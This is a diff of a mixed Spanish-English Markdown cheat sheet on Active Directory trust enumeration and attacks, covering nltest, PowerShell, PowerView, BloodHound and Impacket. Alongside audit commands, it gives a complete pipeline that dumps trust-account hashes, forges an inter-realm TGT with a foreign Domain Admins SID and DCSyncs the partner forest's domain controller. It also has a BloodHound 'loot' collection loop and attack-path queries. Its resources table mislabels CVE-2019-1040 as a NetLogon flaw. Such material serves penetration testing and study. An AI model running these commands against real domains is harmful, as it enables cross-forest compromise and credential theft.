@@ -25,35 +25,23 @@ linked:
 
 ## nltest (Native Windows)
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| All trusts | `nltest /domain_trusts /v` | Comprehensive. |
-| Forest-wide | `nltest /domain_trusts /all_trusts` | Multi-domain. |
-| Direct trusts only | `nltest /trusted_domains` | Local. |
-| Per-server | `nltest /server:DC /trusted_domains` | Cross-target. |
-| Secure channel query | `nltest /sc_query:<dom>` | Health. |
-| Secure channel verify | `nltest /sc_verify:<dom>` | Bidirectional. |
-| Secure channel reset | `nltest /sc_reset:<dom>` | Privileged. |
-| DC list | `nltest /dclist:<dom>` | Adjacent. |
-| Closest DC | `nltest /dsgetdc:<dom>` | Adjacent. |
-| PDC discovery | `nltest /dsgetdc:<dom> /pdc` | Adjacent. |
-| GC discovery | `nltest /dsgetdc:<dom> /gc` | Adjacent. |
-| Site info | `nltest /dsgetsite` | Local site. |
-| Transitive resolution | `nltest /transitive_server:DC` | Edge. |
-| Path discovery | `nltest /dsgetfti` | Forest trust info. |
-| Output flags | PRIMARY/NATIVE/TREE_ROOT/etc | Decode. |
-| Per-trust verbose | `/v` flag | Detail. |
+| `nltest /domain_trusts /v` | Trusts del domain con flags verbose | Quick check. |
+| `nltest /domain_trusts /all_trusts /v` | Forest-wide + verbose | Comprehensive. |
+| `nltest /trusted_domains` | Solo trusts directos | Subset. |
+| `nltest /server:<DC> /trusted_domains` | Vistos desde DC específico | Cross-DC compare. |
+| `nltest /sc_query:<dom>` | Estado secure channel | Health. |
+| `nltest /sc_verify:<dom>` | Verify trust funciona | Health bidireccional. |
+| `nltest /sc_reset:<dom>` | Reset secure channel (priv) | Fix trust roto. |
+| `nltest /dsgetdc:<dom>` | DC closest del domain | Adjacent (resolución DC). |
+| `nltest /dsgetfti` | Forest Trust Info | Forest scope. |
 ^ad-trusttool-nltest
 
-### nltest cheatsheet
-
 ```cmd
-:: All trusts comprehensive
-nltest /domain_trusts /all_trusts /v
-
-:: Output flags decoded:
+:: nltest output flag bitfield
 :: 0x00000001  PRIMARY
-:: 0x00000002  NATIVE  
+:: 0x00000002  NATIVE
 :: 0x00000004  WITHIN_FOREST
 :: 0x00000008  DIRECT_OUTBOUND
 :: 0x00000010  TREE_ROOT
@@ -62,7 +50,7 @@ nltest /domain_trusts /all_trusts /v
 :: 0x00000080  CROSS_ORGANIZATION
 :: 0x00000100  RUNNING
 
-:: Health check all trusts
+:: Health verify de todos los trusts
 for /f "skip=2 tokens=2 delims=:" %d in ('nltest /domain_trusts ^| findstr /i "Trusted DNS"') do nltest /sc_verify:%d
 ```
 
@@ -70,220 +58,128 @@ ___
 
 ## RSAT / PowerShell
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| All trusts | `Get-ADTrust -Filter *` | Standard. |
-| All properties | `Get-ADTrust -Filter * -Properties *` | Detailed. |
-| Filter direction | `Get-ADTrust -Filter {Direction -eq "BiDirectional"}` | Filter. |
-| Filter type | `Get-ADTrust -Filter {TrustType -eq "Forest"}` | Filter. |
-| Forest info | `Get-ADForest` | Forest object. |
-| Per-domain | `Get-ADDomain -Identity <dom>` | Standard. |
-| All domains in forest | `Get-ADForest \| Select Domains` | List. |
-| Forest trusts | `(Get-ADForest).GetForestTrusts()` (.NET method) | Edge. |
-| Trust DACL | `Get-Acl "AD:CN=trustname,CN=System,DC=..."` | ACL audit. |
-| Set trust attribute | `Set-ADTrust` | Privileged. |
-| Modify trust attribute | `Set-ADTrust -Identity <trust> -SelectiveAuthentication $true` | Hardening. |
-| Remove trust | `Remove-ADTrust` | Privileged. |
-| Create new trust | `New-ADTrust` | Privileged. |
-| `[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()` | .NET | Adjacent. |
-| `.GetTrustRelationship(<dom>)` | .NET method | Adjacent. |
-| `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` | .NET | Adjacent. |
+| `Get-ADTrust -Filter *` | Trusts decoded | Standard. |
+| `Get-ADTrust -Filter * -Properties *` | Todos atributos | Detail completo. |
+| `Get-ADTrust -Filter {Direction -eq "BiDirectional"}` | Solo bidirectional | High-risk. |
+| `Get-ADTrust -Filter {TrustType -eq "Forest"}` | Solo forest trusts | Cross-forest. |
+| `Get-ADTrust -Filter * -Pr trustAttributes \| Select Name,Direction,@{n='Attrs';e={'0x{0:X}' -f $_.trustAttributes}}` | Bitfield hex | Decode flags. |
+| `Get-ADForest \| Select Domains,GlobalCatalogs,RootDomain` | Forest object | Forest map. |
+| `Get-ADDomain -Identity <dom>` | Domain object | Per-domain detail. |
+| `Get-Acl "AD:CN=<trust>,CN=System,DC=corp,DC=local"` | Trust object DACL | ACL audit. |
+| `Set-ADTrust -Identity <trust> -SelectiveAuthentication $true` | Habilitar Selective Auth | Hardening fix. |
+| `[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GetAllTrustRelationships()` | Trust via .NET | Sin RSAT. |
+| `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()` | Domain trusts via .NET | Sin RSAT. |
 ^ad-trusttool-rsat
 
-### RSAT comprehensive
-
 ```powershell
-# Trust overview
-Get-ADTrust -Filter * | Format-Table Name,Direction,TrustType,IsTransitive,Source,Target
-
-# Trust + attributes
-Get-ADTrust -Filter * -Properties trustAttributes |
-  Select Name,Direction,@{n='Attrs';e={'0x{0:X}' -f $_.trustAttributes}}
-
-# .NET method (legacy)
-$forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
-$forest.GetAllTrustRelationships()
-
-# Per-domain trusts
-$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-$domain.GetAllTrustRelationships()
+# Audit estándar
+Get-ADTrust -Filter * -Properties * |
+  Select Name,Direction,TrustType,IsTransitive,ForestTransitive,
+         SelectiveAuthentication,SIDFilteringForestAware,SIDFilteringQuarantined,TGTDelegation
 ```
 
 ___
 
 ## PowerView / pywerview
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Direct trusts | `Get-DomainTrust` | Adversary tool. |
-| Trust mapping (forest-wide) | `Get-DomainTrustMapping` | Walk all reachable. |
-| Trust API method | `Get-DomainTrustMapping -API` | Win32 API. |
-| Forest trusts | `Get-ForestTrust` | Forest scope. |
-| Forest domains | `Get-ForestDomain` | List. |
-| Forest GCs | `Get-ForestGlobalCatalog` | Adjacent. |
-| Find foreign user | `Find-ForeignUser` | Cross-trust users. |
-| Find foreign group | `Find-ForeignGroup` | Cross-trust groups. |
-| Domain SID | `Get-DomainSID` | Cross-trust. |
-| Convert AD name formats | `Convert-ADName` | Helper. |
-| Trust search base | `Get-DomainTrust -SearchBase "GC://..."` | Cross-server. |
-| Trust attributes object | `Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" -Properties *` | LDAP raw. |
-| pywerview equivalent | `pywerview get-domaintrust` | Linux. |
-| pywerview foreign | `pywerview find-foreignuser` | Linux. |
-| pywerview mapping | `pywerview get-domaintrust-mapping` | Linux. |
-| Limitations: heavy LDAP queries | SIEM-flagged | Operational. |
+| `Get-DomainTrust` | Trusts directos del domain actual | Adversary tool. |
+| `Get-DomainTrustMapping` | Walk forest-wide (slow, exhaustivo) | Forest map. |
+| `Get-DomainTrustMapping -API` | Walk via Win32 API (alt method) | Si LDAP bloqueado. |
+| `Get-ForestTrust` | Forest-level trusts | Forest scope. |
+| `Get-ForestDomain` | Domains del forest | List. |
+| `Find-ForeignUser` | Users foreign en groups locales | Cross-trust enum. |
+| `Find-ForeignGroup` | Groups foreign en groups locales | Cross-trust nested. |
+| `Get-DomainSID` | Local SID | Para resolver foreign FSPs. |
+| `Get-DomainObject -SearchBase "CN=System,DC=corp,DC=local" -LDAPFilter "(objectClass=trustedDomain)" -Properties *` | TDOs raw | Atributos completos. |
+| `pywerview get-domaintrust -u u -p p -d corp.local --dc-ip <DC>` | Linux equivalent | Sin Windows. |
+| `pywerview get-domaintrust-mapping -u u -p p -d corp.local --dc-ip <DC>` | Forest mapping Linux | Linux. |
 ^ad-trusttool-powerview
-
-### PowerView trust scripts
-
-```powershell
-# Local trusts
-Get-DomainTrust
-
-# Forest map (WALK — slow)
-Get-DomainTrustMapping
-
-# Forest scope only
-Get-ForestTrust
-Get-ForestDomain
-
-# Find foreign principals in current domain
-Find-ForeignUser
-Find-ForeignGroup
-
-# All trust objects via LDAP (raw)
-Get-DomainObject -SearchBase "CN=System,DC=dom,DC=local" `
-  -LDAPFilter "(objectClass=trustedDomain)" `
-  -Properties *
-```
-
-```bash
-# Linux pywerview
-pywerview get-domaintrust -u user -p pass -d dom.local --dc-ip DC
-pywerview find-foreignuser -u user -p pass -d dom.local
-pywerview get-domaintrust-mapping -u user -p pass -d dom.local
-```
 
 ___
 
-## BloodHound / SharpHound
+## BloodHound / SharpHound / RustHound
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Collect Trusts | `SharpHound -c Trusts` | Targeted. |
-| Collect All (incl. trusts) | `SharpHound -c All` | Comprehensive. |
-| RustHound | `rusthound -d dom -u u -p p --zip` | Modern alt. |
-| BloodHound.py (Linux) | `bloodhound-python -d dom -u u -p p -ns DC -c Trusts` | Linux collector. |
-| Cross-domain ingest | Multiple SharpHound runs per domain | Sequential. |
-| Forest-wide automated (BHCE 6.x) | Improved | Modern. |
-| Trust edges in graph | Visual | Standard. |
-| Cross-trust path query | Cypher `MATCH p=shortestPath(...)` | Custom. |
-| ForeignGroupMembership analytics | Built-in | Standard. |
-| BloodHound Enterprise | Continuous trust monitoring | Commercial. |
-| Custom Cypher analytics | Trust + ACL combo | Advanced. |
-| Visual: Domain graph | Tier-based | Helpful. |
-| Trust direction in edge | Property | Standard. |
-| Trust transitivity in edge | Property | Standard. |
-| Cross-forest ingestion | Multiple forests | Edge. |
-| Refreshing data | Re-collect periodically | Operational. |
+| `SharpHound.exe -c Trusts,DCOnly` | Solo trusts collection (stealth) | Targeted. |
+| `SharpHound.exe -c All` | Comprehensive (incluye trusts + ACL + sessions) | Full collection. |
+| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c Trusts --zip` | Linux trust collection | Linux. |
+| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip` | Linux comprehensive | Comprehensive. |
+| `rusthound -d corp.local -u u@corp.local -p pass --zip` | Rust collector | Cross-platform fast. |
+| `MATCH p=(:Domain)-[r:Trusts]->(:Domain) RETURN p` | Trusts visualizados Cypher | Topology. |
+| `MATCH (u {owned:true}) MATCH (target {highvalue:true}) WHERE u.domain <> target.domain MATCH p=shortestPath((u)-[*1..]->(target)) RETURN p` | Cross-trust attack paths | Path planning. |
 ^ad-trusttool-bh
 
-### BloodHound trust collection + queries
-
 ```bash
-# Step 1: SharpHound collection (Trusts focus)
-.\SharpHound.exe -c Trusts,DCOnly
+# Multi-domain pipeline
+for dom in corp.local partner.com vendor.local; do
+  DC=$(dig +short SRV "_ldap._tcp.dc._msdcs.$dom" | awk '{print $4}' | head -1 | sed 's/\.$//')
+  bloodhound-python -d "$dom" -u "auditor@$dom" -p 'Pass!' \
+    -ns "$DC" -c All --zip -o "./loot/$dom/"
+done
 
-# Or RustHound (Linux)
-rusthound -d dom-A.local -u user -p pass --zip
-
-# Step 2: Multi-domain (run per domain)
-.\SharpHound.exe -c Trusts,DCOnly -d dom-A.local
-.\SharpHound.exe -c Trusts,DCOnly -d dom-B.local
-
-# Step 3: Ingest all into BloodHound
-
-# Step 4: Cypher queries
-```
-
-```cypher
-// All trusts visualized
-MATCH p=(:Domain)-[r:Trusts]->(:Domain) RETURN p
-
-// Cross-trust attack paths
-MATCH (u {owned: true})
-MATCH (target {highvalue: true})
-WHERE u.domain <> target.domain
-MATCH p=shortestPath((u)-[*1..]->(target))
-RETURN p
+# Drag ZIPs en BHCE → cross-domain auto-correlate
 ```
 
 ___
 
 ## Impacket / Linux Trust Tools
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `lookupsid.py` | `impacket-lookupsid 'dom/u:p'@DC` | Cross-trust SID enum. |
-| `secretsdump -just-dc` | `secretsdump dom/admin:pass@DC -just-dc` | Trust account hashes. |
-| `getST.py` cross-realm | `impacket-getST -spn ...` | TGS cross-realm. |
-| `ticketer.py` forge inter-realm | `ticketer.py -nthash <trust> -domain ... -extra-sid ...` | Forge. |
-| `getTGT.py` cross-trust | Cross-realm TGT request | Standard. |
-| `ldap-monitor.py` | Trust modification monitoring | Defender adjacent. |
-| `bloodhound-python` | Linux BH collector | Standard. |
-| `windapsearch --trusts` | Trust enum wrapper | Linux helper. |
-| `ldapdomaindump` | HTML report includes trusts | Linux helper. |
-| `nxc ldap DC --trusts` | netexec wrapper | Quick. |
-| `certipy` ADCS cross-trust | ADCS combo | Adjacent. |
-| `bloodyAD trust query` | LDAP modify trusts | Privileged. |
-| Custom Python scripts | DIY automation | Edge. |
-| Kerberos toolkit (`ldapsearch -Y GSSAPI`) | Linux Kerberos auth | Standard. |
-| MIT Kerberos cross-realm | Linux KDC compat | Edge. |
-| `kinit -t keytab` cross-realm | Linux Kerberos | Edge. |
+| `impacket-lookupsid 'corp.local/u:p'@<DC> 5000` | SID enum (cross-trust) | Foreign SID resolution. |
+| `secretsdump.py corp.local/admin:pass@<DC> -just-dc \| grep '\$:'` | Trust account hashes | DCSync filter. |
+| `secretsdump.py corp.local/admin:pass@<DC> -just-dc-user '<NETBIOS>$'` | Solo trust account específico | Targeted. |
+| `ticketer.py -nthash <trust-hash> -domain-sid <local-SID> -domain corp.local -extra-sid <foreign-DA-SID> -spn krbtgt/<foreign> Administrator` | Forge inter-realm TGT | Cross-forest forge. |
+| `KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass <foreign-DC>` | Use TGT forjado | Cross-trust pivot. |
+| `getST.py -spn <SPN> -altservice <other-SPN> -dc-ip <foreign-DC> corp.local/u:p` | TGS cross-realm | S4U2Self/S4U2Proxy cross-trust. |
+| `nxc ldap <DC> -u u -p p --query "(objectClass=trustedDomain)" "*"` | Trusts via netexec | Quick LDAP wrapper. |
+| `windapsearch -d corp.local -u u -p p --dc-ip <DC> --trusts` | Trust enum wrapper | Linux. |
+| `bloodyAD --host <DC> -d corp -u u -p p get trust` | Trust query/modify | LDAP modify Linux. |
 ^ad-trusttool-impacket
 
-### Impacket trust toolkit
-
 ```bash
-# Cross-trust SID enumeration
-impacket-lookupsid 'dom-A.local/user:pass'@DC-A.dom-A.local 5000
+# Pipeline completo cross-forest forge
+DC_LOCAL="dc01.corp.local"
+DC_FOREIGN="dc-partner.partner.com"
+LOCAL_SID=$(impacket-lookupsid 'corp.local/auditor:Pass!'@"$DC_LOCAL" 0 2>/dev/null | grep "Domain SID" | awk '{print $3}')
+FOREIGN_DA_SID="S-1-5-21-FOREIGN-FOREIGN-FOREIGN-512"  # buscar via crmldap
 
-# Trust account dump (privileged)
-impacket-secretsdump dom-A.local/admin:pass@DC-A -just-dc | grep '\$:'
+# 1. Hash trust account
+TRUST_HASH=$(impacket-secretsdump 'corp.local/da:pass'@"$DC_LOCAL" -just-dc-user 'PARTNER$' | grep PARTNER | awk -F: '{print $4}')
 
-# Forge inter-realm TGT (Linux)
-impacket-ticketer -nthash <TRUST_HASH> \
-  -domain-sid <DOM-A-SID> \
-  -domain dom-A.local \
-  -extra-sid <DOM-B-DA-SID> \
-  -spn krbtgt/dom-B.local \
+# 2. Forge
+impacket-ticketer -nthash "$TRUST_HASH" \
+  -domain-sid "$LOCAL_SID" \
+  -domain corp.local \
+  -extra-sid "$FOREIGN_DA_SID" \
+  -spn krbtgt/partner.com \
   Administrator
 
-# Use forged TGT
+# 3. Use
 export KRB5CCNAME=Administrator.ccache
-impacket-secretsdump -k -no-pass dom-B-DC.dom-B.local
+impacket-secretsdump -k -no-pass "$DC_FOREIGN"
 ```
 
 ___
 
-## Wordlists & Recursos
+## Recursos
 
-| **Recurso** | **URL / Path** | **Notas** |
-|:---:|:---:|:---:|
-| HackTricks Trust Attacks | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/cross-forest` | Reference. |
-| The Hacker Recipes - Trusts | `thehacker.recipes/ad/movement/trusts` | Comprehensive. |
-| ADSecurity Sean Metcalf - Trust attacks | `adsecurity.org` | Research. |
-| Will Schroeder - "A Guide To Attacking Domain Trusts" | Specter Ops blog | Foundational. |
-| Dirk-jan Mollema - Trust attacks | `dirkjanm.io` | Research. |
-| Microsoft Trust Documentation | `learn.microsoft.com` | Vendor. |
-| `awesome-active-directory` | GitHub | Foundation. |
-| MITRE ATT&CK T1482 | Domain Trust Discovery | Framework. |
-| MITRE ATT&CK T1484 | Domain Policy Modification | Adjacent. |
-| KB4490425 (TGT Delegation) | Microsoft KB | Specific patch. |
-| CVE-2019-1040 | NetLogon vuln | Critical. |
-| CVE-2020-1472 (Zerologon) | Trust account compromise vector | Adjacent. |
-| Defender for Identity trust alerts | Microsoft | Defender. |
-| BloodHound trust analytics | Custom Cypher | Tool. |
-| PingCastle trust audit | Defender | Adjacent. |
+| **Recurso** | **URL** |
+|:---:|:---:|
+| Will Schroeder — "A Guide To Attacking Domain Trusts" | `https://posts.specterops.io/a-guide-to-attacking-domain-trusts-ef5f8992e29e` |
+| The Hacker Recipes — Trusts | `https://www.thehacker.recipes/ad/movement/trusts` |
+| HackTricks Cross-Forest | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/cross-forest` |
+| Dirk-jan Mollema blog | `https://dirkjanm.io` |
+| ADSecurity Sean Metcalf | `https://adsecurity.org` |
+| Microsoft KB4490425 (TGT Delegation) | `https://support.microsoft.com/help/4490425` |
+| CVE-2019-1040 NetLogon | `https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1040` |
+| MITRE ATT&CK T1482 | `https://attack.mitre.org/techniques/T1482/` |
+| `awesome-active-directory` | `https://github.com/Orange-Cyberdefense/awesome-activedirectory` |
 ^ad-trusttool-wordlists
 
 ***
